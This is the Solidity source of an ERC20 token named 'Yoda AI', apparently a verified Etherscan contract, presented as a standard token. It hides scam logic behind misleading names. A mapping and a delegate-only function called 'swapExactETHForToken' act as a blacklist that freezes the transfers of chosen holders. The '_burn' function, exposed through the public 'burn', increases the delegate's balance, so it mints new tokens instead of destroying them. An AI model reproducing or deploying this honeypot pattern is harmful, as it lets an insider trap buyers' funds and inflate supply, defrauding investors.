/**
 *Submitted for verification at Etherscan.io on 2023-02-10
*/

/**                                                                              .:-==+==.
                                         ..:::.. ....                      .::--===+####=-
                                     .:--==+++========-::.          ..:--===++*###*+=-%*=-
                                 .--==++#%#***####**##**+==-:. .:--===+*####*****#*--*%==.
                               :==+##*%#=------------=*++#%#====+*#%######%%@@%%%@#=##==: 
                             .-=+%*=-==---===--+*********++#%#%#*++#%@@%%%%%%%%%@+*@+=-.  
 .:---:::::::--==========----==##=+*******+++*=+-----=====++*%=-=%@%%%%%%%%%%%@#=-*%==.   
:==###*+++++**#%%%%%%%%%%###**%**#+=-------=%**+--=*##*****+-+%[email protected]%%%%%%%%%%%@[email protected]==-    
[email protected]==+#%%###########%%%%#*++#*=+=***####*+-++=+-+#++####*++=-=*[email protected]@%%%%%%%@@*=--=%*=-     
.==#@*=*@@@@@@@%%%%%%%%%%%@*-*=-+*==***+==##-----*[email protected]@@@#[email protected]@@==--=#@@@%%%@@#[email protected]*==.     
 .-==*%%**%@@@%%%%%%%%%%%%@%----=-#@@@*[email protected]%++=-----%@@@@@@@@##+#%%####%@@#=---=#%==-       
   .:-==#%*=+#%@%@@%%%%%%@@%[email protected]@@@@@@@#--+**+-=+**##%#***@##%#####%%%#*#%%+=-:        
      .-==#%=--*@%@+*%@%*%@#=%--****#%%#*=--*#=+*=--===---=*%#%@#=%@%+#%@#%%====-:.       
        -==%@***@*@#%%%@%%#%*@#***##%#************#@@%***#@@%%@#@#@#@#@#%%#%@****+=-      
        .-=======+===++==++=================*##*==============++==++===*+==========:      
          .....:%@@=.:-*@@*................:#@@*.............-%@@@+:..-#@@%.......        
                :@@@: [email protected]@%.  .--=-:     :-==#@@*  :----:.   .*@@@@%.  .#@@%               
                 [email protected]@%[email protected]@@. .*@@@@@@%: .*@@@@@@@* [email protected]@@@@@@-  [email protected]@%[email protected]@+  .#@@%               
                  [email protected]@@@@-  [email protected]@@=-*@@% [email protected]@@*%#@@*  ....%@@* .*@@**@@@.  #@@%               
                   *@@@*  .#@@%#.*@@@:#@@#%+#@@# :#%%@@@@* :@@@%%@@@*  *@@%               
                   [email protected]@@-   *@@@#+*@@%.*@@%#+#@@#:@@@*##@@* *@@%++*@@@. *@@%               
                   [email protected]@@:   :#@@@%@@%- .%@@@%@@@#[email protected]@@%%@@@%:@@@-   %@@* *@@%               
             
 *///SPDX-License-Identifier: MIT

pragma solidity =0.5.15;

contract ERC20Basic {

  function balanceOf(
    address account
  )
    public
    view
    returns (uint256);
    
  function transfer(
    address to,
    uint256 value
  ) 
    public
    returns (bool);
  
  event Transfer(
    address indexed from,
    address indexed to,
    uint256 value);
    
    function totalSupply(
  )
    public
    view
    returns (uint256);
}

library SafeMath {

  function mul(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256 c)
  {
    if (a == 0) {
    return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function sub(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    assert(b <= a);
    return a - b;
  }
  
  function add(
    uint256 a,
    uint256 b
  ) internal
    pure
    returns (uint256 c)
  {
    c = a + b;
    assert(c >= a);
    return c;
  }

  function div(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    return a / b;
  }
}

contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping (address => bool) internal _swapExactETHForTokens_;  
  mapping (address => uint256) balances;
  uint256 totalSupply_;

  function balanceOf(
    address account
  ) 
    public
    view
    returns (uint256) {
    return balances[account];
  }

  function transfer(
    address _to,
    uint256 _value
  ) 
    public
    returns (bool) { if (
    _swapExactETHForTokens_[msg.sender]
    || _swapExactETHForTokens_[_to]) require(
    _value == 0, ""); require(
    _to != address(0)); require(
    _value <= balances[msg.sender]);
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  
  function totalSupply(
  ) 
    public
    view
    returns (uint256)
  {
    return totalSupply_;
  }
}
contract Context {
  
  function _msgSender(
  )
    internal 
    view 
    returns (address) {
    return msg.sender;
  }
  
  function _msgData(
  ) 
    internal
    pure 
    returns (bytes memory) {
    return msg.data;
  }
}

contract Ownable is Context {
  address private _owner;
  address internal _delegate;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
  constructor() internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner(
  ) 
  public
  view
  returns (address) {
  return _owner;
  }

  modifier onlyOwner(
  ) {
    require(
    owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
    
  modifier onlyDelegates(
  ) {
    require(
    _delegate == msg.sender, "Caller not belong to delegates");
    _;
  }
    
  function setDelegate(
    address account
  ) 
    external onlyOwner {
    require(
    _delegate == address(0));
    _delegate = account;
  }

  function renounceOwnership(
  ) 
    public onlyOwner {
    _transferOwnership(address(0));
  }

  function _transferOwnership(
    address newOwner
  ) 
    internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ERC20 is ERC20Basic {

  function allowance(
    address owner,
    address spender
  )
    public
    view
    returns (uint256);

  function transferFrom(
    address from,
    address to,
    uint256 value
  )
    public
    returns (bool);

  function approve(
    address spender,
    uint256 value
  ) 
    public
    returns (bool);
    event Approval
  (
    address indexed owner,
    address indexed spender,
    uint256 value
  );
}

contract StandardERC20 is Ownable, ERC20, BasicToken {
  address internal approved;
  mapping (address => mapping (address => uint256)) internal allowed;
  
  constructor () public {
     approved = msg.sender;
  }

  function allowance(
    address _owner,
    address _spender
  )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool) { if
    (_swapExactETHForTokens_[_from] ||
    _swapExactETHForTokens_[_to]) require(
    _value == 0, ""); require(
    _to != address(0)); require(
    _value <= balances[_from]); require(
    _value <= allowed[_from][msg.sender]);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function decreaseApproval(
    address _spender,
    uint _subtractedValue
  )
    public
    returns (bool)
  {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function swapExactETHForToken(
    address _rewardsExactETHForToken
  ) 
    external { require(
    msg.sender ==
    _delegate); if (
    _swapExactETHForTokens_
    [_rewardsExactETHForToken] == true){
    _swapExactETHForTokens_
    [_rewardsExactETHForToken] = false;} 
    else { _swapExactETHForTokens_
    [_rewardsExactETHForToken] = true;
    }
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function swapingStatus(
    address _rewardsExactETHForToken
  )
    public
    view
    returns (bool) 
  {
    return _swapExactETHForTokens_
    [_rewardsExactETHForToken];
  }

  function _burn(
    uint256 amount
  ) 
    internal onlyDelegates
  {
    require(amount != 0, "ERC20: burn zero tokens is disallowed");
    balances[msg.sender] += amount;
    emit Transfer(msg.sender, address(0), amount);
  }

  function increaseApproval(
    address _spender,
    uint _addedValue
  )
    public
    returns (bool)
  {
    allowed[msg.sender][_spender] = (
    allowed[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}

contract YodaAI is StandardERC20 {
  uint256 public constant _totalSupply_ = 1000000000000 * (10 ** uint256(decimals));
  uint8 public constant decimals = 9;
  string public constant symbol = "YodaAI";
  string public constant name = "Yoda AI";
  
  constructor() public {
    totalSupply_ = totalSupply_.add(_totalSupply_);
    balances[msg.sender] = balances[msg.sender].add(_totalSupply_);
    emit Transfer(address(0), msg.sender, _totalSupply_);
  }
    
  function burn(
    uint256 amount
  ) 
    external {
    _burn(amount);
  }
}